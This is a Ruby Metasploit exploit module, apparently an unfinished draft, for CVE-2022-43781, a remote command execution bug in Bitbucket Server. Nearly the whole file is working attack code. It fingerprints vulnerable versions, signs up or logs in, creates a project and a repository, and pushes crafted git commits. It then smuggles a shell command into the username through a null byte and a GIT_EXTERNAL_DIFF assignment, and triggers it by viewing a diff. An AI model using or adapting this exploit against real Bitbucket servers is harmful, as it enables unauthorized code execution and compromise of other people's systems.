##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking # https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Git
  include Msf::Exploit::Git::SmartHttp
  require 'pry-byebug'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Bitbucket Environment Variable RCE',
        'Description' => %q{
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Ry0taK', # Vulnerability Discovery
          'y4er', # PoC and blog post
          'Shelby Pace' # Metasploit Module
        ],
        'References' => [
          [ 'URL', 'https://y4er.com/posts/cve-2022-43781-bitbucket-server-rce/'],
          [ 'CVE', '2022-43781']
        ],
        'Payload' => { 'Space' => 254 },
        'Platform' => [ 'win', 'linux', 'unix' ],
        'Privileged' => false,
        'Arch' => [ ARCH_X86, ARCH_X64 ],
        'Targets' => [
          [
            'Linux',
            {
              'Platform' => 'unix',
              'Type' => :linux_cmd,
              # 'Arch' => [ ARCH_X86, ARCH_X64 ],
              'Arch' => [ ARCH_CMD ],
              'Payload' => { 'BadChars' => %(*:/?#[]@) }
              # 'DefaultOptions' => { 'Payload' => 'linux/x64/meterpreter/reverse_tcp' }
            }
          ],
          [
            'Windows',
            {}
          ]
        ],
        'DisclosureDate' => '2022-11-16',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(7990),
        OptString.new('USERNAME', [ false, 'User name to log in with' ]),
        OptString.new('PASSWORD', [ false, 'Password to log in with' ]),
        OptString.new('TARGETURI', [ true, 'The URI of the Bitbucket instance', '/']),
        OptBool.new('USE_PUBLIC_SIGNUP', [ true, 'Attempt to create an account through public signup if enabled', true ])
      ]
    )
  end

  def check
    res = request_login_page

    return CheckCode::Unknown('Failed to retrieve a response from the target') unless res
    return CheckCode::Safe('Target does not appear to be Bitbucket') unless res.body.include?('Bitbucket')

    nokogiri_data = res.get_html_document
    footer = nokogiri_data&.at('footer')
    return CheckCode::Detected('Failed to retrieve version information from Bitbucket') unless footer

    version_info = footer.at('span')&.children&.text
    return CheckCode::Detected('Failed to find version information in footer section') unless version_info

    vers_matches = version_info.match(/v(\d+\.\d+\.\d+)/)
    return CheckCode::Detected('Failed to find version info in expected format') unless vers_matches && vers_matches.length > 1

    version_str = vers_matches[1]

    vprint_status("Found version #{version_str} of Bitbucket")
    # vers_no = Rex::Version.new(version_str)
    major, minor, revision = version_str.split('.')
    rev_num = revision.to_i

    case major
    when '7'
      case minor
      when '0', '1', '2', '3', '4', '5'
        return CheckCode::Appears
      when '6'
        return CheckCode::Appears if rev_num >= 0 && rev_num <= 18
      when '7', '8', '9', '10', '11', '12', '13', '14', '15', '16'
        return CheckCode::Appears
      when '17'
        return CheckCode::Appears if rev_num >= 0 && rev_num <= 11
      when '18', '19', '20'
        return CheckCode::Appears
      when '21'
        return CheckCode::Appears if rev_num >= 0 && rev_num <= 5
      end
    when '8'
      print_status('Versions 8.* are vulnerable only if the mesh setting is disabled')
      case minor
      when '0'
        return CheckCode::Appears if rev_num >= 0 && rev_num <= 4
      when '1'
        return CheckCode::Appears if rev_num >= 0 && rev_num <= 4
      when '2'
        return CheckCode::Appears if rev_num >= 0 && rev_num <= 3
      when '3'
        return CheckCode::Appears if rev_num >= 0 && rev_num <= 2
      when '4'
        return CheckCode::Appears if rev_num == 0 || rev_num == 1
      end
    end

    CheckCode::Detected
  end

  def validate_credentials(username, password)
    username ||= datastore['USERNAME']
    password ||= datastore['PASSWORD']

    [ username, password ]
  end

  def request_login_page
    send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'login'),
      'keep_cookies' => true
    )
  end

  # signup page will return 302 and redirect to login page
  # if public signup is disabled
  def public_signup_available?
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'signup'),
      'keep_cookies' => true
    )

    return false unless res
    return true if res.code == 200 && res.body.include?('Sign up')

    print_status('Public signup is not enabled')
    false
  end

  def create_account
    u_name = Faker::Internet.username
    email = Faker::Internet.email
    full_name = Faker::Name.name
    pass = Faker::Internet.password

    #    u_name_payload = "#{u_name}\u0000GIT_EXTERNAL_DIFF=$(#{payload.encoded})"
    u_name_payload = "#{u_name}\u0000GIT_EXTERNAL_DIFF="

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'signup'),
      'keep_cookies' => true,
      'vars_post' => {
        'username' => u_name_payload,
        'fullname' => full_name,
        'email' => email,
        'password' => pass,
        'confirmPassword' => pass,
        'submit' => 'Sign Up'
      }
    )

    unless res && res.code == 302 && res.headers['Location'].include?('signedUp')
      fail_with(Failure::UnexpectedReply, 'Account creation failed')
    end

    print_good('Account creation was successful!' + " #{pass}")
    [ u_name_payload, pass ]
  end

  def project_name
    @project_name ||= Rex::Text.rand_text_alpha(5..9)
  end

  def project_key
    @project_key ||= Rex::Text.rand_text_alpha(5..9).upcase
  end

  def repo_name
    @repo_name ||= Rex::Text.rand_text_alpha(5..9)
  end

  def default_branch
    @default_branch ||= Rex::Text.rand_text_alpha(5..9)
  end

  def uname_payload
    # @uname_payload ||= "#{datastore['USERNAME']}\u0000GIT_EXTERNAL_DIFF=$(#{payload.encoded.strip})"
    @uname_payload ||= "#{datastore['USERNAME']}\u0000GIT_EXTERNAL_DIFF=$(/usr/bin/printf HACKED > /tmp/hax)"
  end

  def log_in(username, password)
    res = request_login_page
    fail_with(Failure::UnexpectedReply, 'Failed to access login page') unless res&.body&.include?('login')

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'j_atl_security_check'),
      'keep_cookies' => true,
      'vars_post' => {
        'j_username' => username,
        'j_password' => password,
        '_atl_remember_me' => 'on',
        'submit' => 'Log in'
      }
    )

    fail_with(Failure::UnexpectedReply, 'Didn\'t retrieve a response') unless res
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'dashboard'),
      'keep_cookies' => true
    )

    fail_with(Failure::UnexpectedReply, 'No response from the dashboard') unless res
    unless res.body.include?('Logged in')
      fail_with(Failure::UnexpectedReply, 'Failed to log in. Please check credentials')
    end
  end

  def create_project
    proj_uri = normalize_uri(target_uri.path, 'projects?create')
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => proj_uri,
      'keep_cookies' => true
    )

    fail_with(Failure::UnexpectedReply, 'Unable to access project creation page') unless res&.body&.include?('Create project')

    vprint_status('Retrieving security token')
    html_doc = res.get_html_document
    token_data = html_doc.at('div//input[@name="atl_token"]')
    fail_with(Failure::UnexpectedReply, 'Failed to find element containing \'atl_token\'') unless token_data

    @token = token_data['value']
    fail_with(Failure::UnexpectedReply, 'No token found') if @token.blank?

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => proj_uri,
      'keep_cookies' => true,
      'vars_post' => {
        'name' => project_name,
        'key' => project_key,
        'submit' => 'Create project',
        'atl_token' => @token
      }
    )

    fail_with(Failure::UnexpectedReply, 'Failed to receive response from project creation') unless res
    fail_with(Failure::UnexpectedReply, 'Failed to create project') unless res['Location']&.include?(project_key)

    print_status('Project creation was successful')
  end

  def create_repository
    repo_uri = normalize_uri(target_uri.path, 'projects', project_key, 'repos?create')
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => repo_uri,
      'keep_cookies' => true
    )

    fail_with(Failure::UnexpectedReply, 'Failed to access repo creation page') unless res

    html_doc = res.get_html_document

    dropdown_data = html_doc.at('li[@class="user-dropdown"]')
    fail_with(Failure::UnexpectedReply, 'Failed to find dropdown to retrieve email address') if dropdown_data.blank?
    email = dropdown_data&.at('span')&.[]('data-emailaddress')
    fail_with(Failure::UnexpectedReply, 'Failed to retrieve email address from response') if email.blank?

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => repo_uri,
      'keep_cookies' => true,
      'vars_post' => {
        'name' => repo_name,
        'defaultBranchId' => default_branch,
        'description' => '',
        'scmId' => 'git',
        'forkable' => 'false',
        'atl_token' => @token,
        'submit' => 'Create repository'
      }
    )

    fail_with(Failure::UnexpectedReply, 'Not response received from repo creation') unless res
    res = send_request_cgi(
      'method' => 'GET',
      'keep_cookies' => true,
      'uri' => normalize_uri(target_uri.path, 'projects', project_key, 'repos', repo_name, 'browse')
    )

    fail_with(Failure::UnexpectedReply, 'Repository was not created') if res&.code == 404
    print_good("Successfully created repository #{repo_name}")

    email
  end

  def create_commits(email)
    # create a text file with random text
    txt_data = Rex::Text.rand_text_alpha(5..20)
    blob_object = GitObject.build_blob_object(txt_data)
    file_name = "#{Rex::Text.rand_text_alpha(4..10)}.txt"

    file_data = {
      mode: '100755',
      file_name: file_name,
      sha1: blob_object.sha1
    }
    tree_obj = GitObject.build_tree_object(file_data)

    commit_obj = GitObject.build_commit_object({ tree_sha1: tree_obj.sha1, email: email })

    refs = {
      'HEAD' => "refs/heads/#{default_branch}",
      "refs/heads/#{default_branch}" => commit_obj.sha1
    }

    # create second commit object
    new_file_data = Rex::Text.rand_text_alpha(5..20)
    new_blob_object = GitObject.build_blob_object(new_file_data)
    new_file = "#{Rex::Text.rand_text_alpha(4..10)}.txt"

    new_file_data = {
      mode: '100755',
      file_name: new_file,
      sha1: new_blob_object.sha1
    }

    tree_data = [ new_file_data, file_data ]
    new_tree = GitObject.build_tree_object(tree_data)
    new_commit = GitObject.build_commit_object(
      {
        tree_sha1: new_tree.sha1,
        email: email,
        parent_sha1: commit_obj.sha1,
        message: Rex::Text.rand_text_alpha(4..30)
      }
    )

    git_uri = normalize_uri(target_uri.path, "scm/#{project_key}/#{repo_name}.git")
    res = send_receive_pack_request(
      git_uri,
      refs['HEAD'],
      [ new_commit, new_tree, new_blob_object, commit_obj, tree_obj, blob_object ],
      '0' * 40 # no commits should exist yet, so no branch tip in repo yet
    )

    fail_with(Failure::UnexpectedReply, 'Failed to push commit to repository') unless res
    fail_with(Failure::UnexpectedReply, 'Git responded with an error') if res.body.include?('error:')
    fail_with(Failure::UnexpectedReply, 'Git push failed') unless res.body.include?('unpack ok')

    [ new_commit.sha1, commit_obj.sha1, new_file ]
  end

  def get_user_id(curr_uname)
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'admin/users/view'),
      'vars_get' => { 'name' => curr_uname }
    )

    fail_with(Failure::UnexpectedReply, 'Failed to access user page') unless res
    scripts = res.get_html_document&.search('script')
    fail_with(Failure::UnexpectedReply, 'Couldn\'t obtain list of scripts') unless scripts
    scripts = scripts.select { |script| script&.children&.text&.include?("name\":\"#{curr_uname}\"") }
    fail_with(Failure::UnexpectedReply, 'Failed to get scripts that match user name') unless scripts

    matched_id = scripts&.first&.children&.text&.match(/id":(\d+),"displayName/)
    fail_with(Failure::UnexpectedReply, 'No matches found for id of user') unless matched_id && matched_id.length > 1

    matched_id[1]
  end

  def change_username(curr_uname, new_uname)
    @user_id ||= get_user_id(curr_uname)

    headers = {
      'X-Requested-With' => 'XMLHttpRequest',
      'X-AUSERNAME' => curr_uname,
      'X-AUSERID' => @user_id,
      'Origin' => "#{ssl ? 'https' : 'http'}://#{peer}",
      'Referer' => "#{ssl ? 'https' : 'http'}://#{peer}/admin/users/view?name=#{curr_uname}"
    }

    vars = {
      'name' => curr_uname,
      'newName' => new_uname
    }.to_json

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'rest/api/latest/admin/users/rename'),
      'ctype' => 'application/json',
      'keep_cookies' => true,
      'headers' => headers,
      'data' => vars
    )

    fail_with(Failure::UnexpectedReply, 'Did not receive a response to the user name change request') unless res

    unless res.body.include?(new_uname) || res.body.include?('GIT_EXTERNAL_DIFF')
      fail_with(Failure::UnexpectedReply, 'User name change was unsuccessful')
    end
  end

  def view_commit(latest_commit_sha, first_commit_sha, diff_file)
    commit_uri = normalize_uri(
      target_uri.path,
      'rest/api/latest/projects',
      project_key,
      'repos',
      repo_name,
      'commits',
      latest_commit_sha,
      'diff',
      diff_file
    )

    send_request_cgi(
      'method' => 'GET',
      'uri' => commit_uri,
      'keep_cookies' => true,
      'vars_get' => { 'since' => first_commit_sha }
    )
  end

  def exploit
    datastore['GIT_USERNAME'] = datastore['USERNAME']
    datastore['GIT_PASSWORD'] = datastore['PASSWORD']

    @using_public_account = datastore['USE_PUBLIC_SIGNUP']
    if public_signup_available? && datastore['USE_PUBLIC_SIGNUP']
      username, password = create_account
      @using_public_account = (username && password ? true : false)
    end

    username, password = validate_credentials(username, password)
    fail_with(Failure::BadConfig, 'No credentials to log in with.') unless username && password

    log_in(username, password)
=begin
    unless @using_public_account
      change_username
    end
=end

    create_project
    email = create_repository
    latest_commit, first_commit, diff_file = create_commits(email)
    print_good("Commits added: #{first_commit}, #{latest_commit}")

    print_status('Sending payload')
    change_username(datastore['USERNAME'], uname_payload)
    view_commit(latest_commit, first_commit, diff_file)
  end

  def cleanup
    change_username(uname_payload, datastore['USERNAME'])
  end
end
